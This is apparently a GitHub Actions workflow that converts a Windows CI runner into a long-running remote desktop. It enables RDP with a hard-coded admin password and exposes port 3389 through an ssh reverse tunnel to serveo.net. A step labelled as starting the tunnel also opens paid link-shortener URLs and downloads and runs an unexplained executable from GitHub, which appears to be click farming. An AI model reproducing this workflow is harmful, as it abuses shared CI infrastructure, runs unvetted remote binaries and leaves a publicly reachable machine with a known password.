name: Chrome Remote Desktop with Serveo

on:
  push:
  workflow_dispatch:
    inputs:
      code:
        description: 'Enter the --code value for Chrome Remote Desktop'
        required: true
        type: string

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360
    
    steps:
      - name: Enable Terminal Services and Firewall Rules
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
      
      - name: Set Password for runneradmin
        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

      - name: Rename Computer to any random number
        run: |
          $randomNumber = Get-Random -Minimum 1 -Maximum 101
          Rename-Computer -NewName ("Computer" + $randomNumber)
        shell: pwsh
        
      - name: Download and Install Chrome Remote Desktop Host
        run: |
          Invoke-WebRequest https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi -OutFile chromeremotedesktophost.msi
          Start-Process msiexec.exe -ArgumentList '/i chromeremotedesktophost.msi /quiet /norestart' -Wait

      - name: Start powershell to enable remote desktop
        run: |
          # Start PowerShell script to launch Chrome Remote Desktop host
          Start-Process -FilePath "powershell.exe" -ArgumentList "-NoExit -Command & {& '${Env:PROGRAMFILES(X86)}\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe' --code='${{ github.event.inputs.code }}' --redirect-url='https://remotedesktop.google.com/_/oauthredirect' --name='nono1321'}"
          Start-Sleep -Seconds 5
          Add-Type -AssemblyName System.Windows.Forms
          [System.Windows.Forms.SendKeys]::SendWait("123456")
          Start-Sleep -Seconds 1
          [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
          Start-Sleep -Seconds 1
          [System.Windows.Forms.SendKeys]::SendWait("123456")
          Start-Sleep -Seconds 1
          [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")

      - name: Create Keep-Alive Script
        run: |
          $keepAliveScript = @"
          while ($true) {
              ssh -R 80:localhost:3389 serveo.net
              # Connect to the remote session to keep it alive
              mstsc /v:$Env:COMPUTERNAME
              echo "Keep-Alive"
              Start-Sleep -Seconds 300  # Sleep for 5 minutes
          }
          "@
          # Specify directory to make it easier to manage
          $keepAlivePath = "C:\keepalive"
          New-Item -Path $keepAlivePath -ItemType Directory -Force
          Set-Content -Path "$keepAlivePath\keepalive.ps1" -Value $keepAliveScript

      - name: Start Serveo Tunnel
        run: |
          $chromeJob = Start-Job -Name "ChromeJob" -ScriptBlock {
              $chromePath = 'C:\Program Files\Google\Chrome\Application\chrome.exe'
              $urls = @(
                "https://cuty.io/xklVyXIr",
                "https://cety.app/ilakFY8T",
                "https://cuty.io/l1Kokl6HGFS",
                "https://cuty.io/k2hrHlfy"
              )
              Start-Process -FilePath $chromePath -ArgumentList $urls -NoNewWindow

              # Create Cutty Account
              Invoke-WebRequest https://github.com/jackricj/winpc23/raw/main/CuttyWebpages.exe -OutFile CuttyWebpages.exe
              Start-Process -FilePath .\CuttyWebpages.exe
          }

          # Start Serveo tunnel in the background
          Start-Process -NoNewWindow -FilePath "powershell.exe" -ArgumentList "-Command & {ssh -R 80:localhost:3389 serveo.net}"

      - name: Check Chrome Job
        run: |
          $chromeJob = Get-Job -Name "ChromeJob"
          if ($chromeJob -eq $null) {
              Write-Host "Chrome Job not found."
          } else {
              Write-Host "Chrome Job is running."
          }

      - name: Keep Alive
        run: |
          Start-Process -NoNewWindow -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\keepalive\keepalive.ps1"
